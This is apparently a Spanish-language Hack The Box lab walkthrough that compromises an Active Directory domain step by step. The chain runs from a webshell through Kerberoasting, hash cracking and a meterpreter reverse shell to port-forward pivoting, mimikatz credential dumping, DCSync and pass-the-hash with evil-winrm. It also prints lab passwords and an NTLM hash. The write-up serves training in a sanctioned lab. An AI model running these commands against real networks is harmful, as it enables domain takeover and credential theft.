--- 
title: "Laboratorio de Enumeración y ataques de AD - Parte 1"  
date: 2025-07-28
tags: [hackthebox, AD]
categories: ["Enumeración AD", "Hack The Box"]
summary: "En este laboratorio de Hack The Box, simulamos una intrusión en una infraestructura corporativa basada en Active Directory. Partiendo de una webshell preinstalada, llevamos a cabo técnicas de enumeración, ataque Kerberoasting, pivoting entre máquinas y, finalmente, compromiso del Domain Controller mediante un ataque DCSync. Se utilizaron herramientas como PowerView, Rubeus, Mimikatz, Metasploit, entre otras."
draft: false 

---
#### Enunciado
Un miembro del equipo inició una prueba de penetración externa y fue transferido a otro proyecto urgente antes de terminarla. Tras realizar un reconocimiento del servidor web externo, logró encontrar y explotar una vulnerabilidad de carga de archivos. Antes de cambiar de proyecto, nuestro compañero dejó un shell web protegido con contraseña (con las credenciales: `admin:My_W3bsH3ll_P@ssw0rd!`) en el `/uploads`directorio para que pudiéramos empezar desde él. Como parte de esta evaluación, nuestro cliente, Inlanefreight, nos autorizó a evaluar nuestra capacidad de penetración y está interesado en determinar qué tipos de problemas de alto riesgo existen en el entorno de Active Directory. Aprovechar el shell web para establecerse inicialmente en la red interna. Analizar el entorno de Active Directory en busca de fallos y configuraciones incorrectas para avanzar lateralmente y, en última instancia, comprometer el dominio.

Aplique lo aprendido en este módulo para comprometer el dominio y responder las preguntas a continuación para completar la parte I de la evaluación de habilidades.


#### **Reconocimiento**
Iniciamos el reconocimiento por la  información que nos proporcionan en el guión. Visitamos el servidor web y vemos los siguiente:


![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon1.png)

Efectivamente desde esta pestaña nos permite subir archivos al servidor. Vamos a ir a la ruta `/uploads`
`http://<IP>/uploads/`
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon2.png)
Seleccionamos la primera y vemos que nos dirige a la webshell que nos hablan al principio. Proporcionamos las credenciales que nos habían brindado.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon3.png)
**Envíe el contenido del archivo flag.txt al escritorio del administrador del servidor web**
Y tenemos acceso a la webshell.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon4.png)
Vemos que justo encima del Submit en la barra inferiror podemos ejecutar comandos. Vamos a la ruta que nos dicen para obtener nuestra primera flag:

```powershell
dir C:\Users\Administrator\Desktop\
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag1-1.png)
Y la leemos con el comando:

```powershell 
type C:\Users\Administrator\Desktop\flag.txt
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag1-2.png)

**Kerberost crea una cuenta con el SPN MSSQLSvc/SQL01.inlanefreight.local:1433 y envía el nombre de la cuenta como respuesta**
Vamos a obtener el nombre del `Domain Controller`:
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-1.png)
Resolvemos la IP del `Domain Controller`
```powershell
Resolve-DnsName DC01.INLANEFREIGHT.LOCAL
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-2.png)
Luego de intentar trabajar con herramientas como `Powerview`,` GetUserSPN.py` y no tener éxito. Lanzamos el comando integrado de `powershell`:
```powershell
setspn -T inlanefreight.local -Q */*
```
[Ver más de SetSPN](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn)

Donde aquí vemos algunos de los usuarios válidos vinculados a servicios que corren por el puerto 1433, si nos fijamos nuestra flag estamos buscando `MSSQLSvc/SQL01.inlanefreight.local:1433` que aquí nos aparece una cuenta `svc_sql` asociada a el. 
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-3.png)
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-4.png)

**Descifra la contraseña de la cuenta. Envía el valor en texto plano:**
Vale ya tenemos la cuenta que es `svc_sql` ahora vamos a aplicar kerberoasting para obtener su contraseña, para esto vamos  a utilizar la herramienta `Rubeus`.
[Link para descargar Rubeus](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe)
Luego que lo tenemos en local lo subimos a a webshell. 
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-1.png)
Y ejecutamos el comando:
```powershell
C:\Rubeus.exe kerberoast /user:svc_sql /nowrap
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-2.png)
Al final nos va a a dar un hash el cual vamos a copiar para descifrar en local con `hascat `o `john`.

```bash
hashcat -m 13100 hash1.txt /usr/share/wordlists/rockyou.txt
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-3.png)
Y vemos que nos da de contraseña `lucky7`.

**Envíe el contenido del archivo flag.txt en el escritorio del Administrador en MS01**
Confirmamos el objetivo 
```powershell 
ping MS01
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-1.png)
Comprobamos las credenciales que tenemos contra el siguiente objetivo, mediante `SMB`:
```powershell
net use \\MS01\C$ /user:inlanefreight.local\svc_sql lucky7
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-2.png)
Nos dan `OK`

```powershell
dir \\MS01\C$\Users\Administrator\Desktop
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-3.png)

Leemos la flag:
```powershell
type \\MS01\C$\Users\Administrator\Desktop\flag.txt
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-4.png)

**Encuentra las credenciales de texto sin cifrar de otro usuario del dominio. Envía el nombre de usuario como respuesta.**

Listamos la carpeta de Usuarios de la Máquina `MS01`
```powershell
dir \\MS01\C$\Users\
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag5-1.png)
Y vemos ahí los usuarios.

**Envíe la contraseña en texto sin cifrar de este usuario.**
Tenemos las credenciales del usuario `svc_sql` para acceder a la máquina MS01. 
Tenemos que el ip de `MS01` es 172.16.6.50
Y necesitamos la contraseña del usuario tpetty.

- Vamos a obtener una shell en la máquina pivote
Ejecutamos desde nuestra máquina.
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP_máquina_atacante> -f exe -o backupscript.exe LPORT=4444
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-1.png)
Subimos el payload para la máquina pivote que nos dan en `HTB`.

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-2.png)
Utilizando metasploit nos ponemos en escucha en nuestra máquina atacante:
```bash
msf6 > use exploit/multi/handler 
set LHOST 10.10.15.154
set LPORT 4444
set payload windows/x64/meterpreter/reverse_https
run
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-3.png)
Ejecutamos el payload en el pivote.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-4.png)
En meterpreter ponemos `shell` y luego `powershell.exe`. Para obtener una terminal powershell.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-5.png)

Observamos que `MS01` tiene el puerto 3389 abierto.
```powershell
Test-NetConnection -ComputerName MS01 -Port 3389
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-6.png)
Con lo que nos vamos a intentar conectar por ahí.
Hacemos portforwarding desde el pivote hacia `MS01` para conectarnos desde nuestra máquina atacante.
```powershell
netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=<IP_pivote> connectport=3389 connectaddress=172.16.6.50
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-7.png)
Nos conectamos remoto por RDP desde nuestra máquina atacante hacia `MS01`.
```bash
xfreerdp3 /v:<IP_pivote>:8888 /u:"inlanefreight\svc_sql" /p:lucky7 /dynamic-resolution /drive:Shared,/opt/Tools/Windows
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-8.png)

Nos copiamos mimikatz.exe de nuestra máquina atacante para `MS01`.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-9.png)
Vamos a la ruta donde copiamos mimikatz.exe y lo abrimos `.\mimikatz.exe`

Ejecutamos `mimikatz` para buscar las credenciales almacenadas en la máquina:
```powershell
privilege::debug
sekurlsa::logonpasswords
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-11.png)

**¿Qué ataque puede realizar este usuario?**
Tenemos el usuario `tpetty` y su contraseña `Sup3rS3cur3D0m@inU2eR`.
Vamos a copiar la herramienta `PowerView.ps1` a `MS01`
Vamos al directorio donde la copiamos desde powershell e importamos el módulo.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-1.png)
Consultamos información sobre el usuario tpetty y guardamos el `SID`
```powershell
Get-DomainUser -Identity tpetty | select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-2.png)
```powershell
$sid= "S-1-5-21-2270287766-1317258649-2146029398-4607"
```

Vemos si tiene los permisos para `DCSync`:
```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
Y vemos que sí.
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-3.png)

 Usamos `runas.exe` para abrirnos una powershell bajo la cuenta de tpetty, proporcionamos su credencial.
```cmd-session
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\tpetty powershell
Enter the password for INLANEFREIGHT\tpetty:
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-4.png)
Vamos y ejecutamos `mimikatz.exe`
```powershell
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-6.png)

Y efectivamente podemos realizar el ataque `DCSync`.

admin_hash ->27dedb1dab4d8545c6e1c66fba077da0

**Tome el control del dominio y envíe el contenido del archivo flag.txt en el Escritorio del administrador en DC01**
Vamos con el `DC01`, vamos a ubicarlo:
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-1.png)
Tiene de IP -> 172.16.6.3, luego tenemos el Usuario `Administrator` y su `hash`.
Vamos a ver los puertos que tiene abiertos para intentar conectarnos.
```powershell
Test-NetConnection -ComputerName DC01 -Port 3389
Test-NetConnection -ComputerName DC01 -Port 5985
```

![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-2.png)
Vemos que el 3389 nos da error pero el 5985 nos da OK.
Vamos a hacer un `portforwarding` hacia ese puerto e intentar acceder desde nuestra máquina atacante. Vamos en nuestra máquina pivote:
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-3.png)
```meterpreter
portfwd add -l 9999 -p 5985 -r 172.16.6.3
```
Utilizamos evil-winrm para conectarnos:
```bash
evil-winrm -i localhost --port 9999 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-4.png)
Ya solo nos movemos a la ubicación de la flag y la leemos
![](../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-5.png)

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.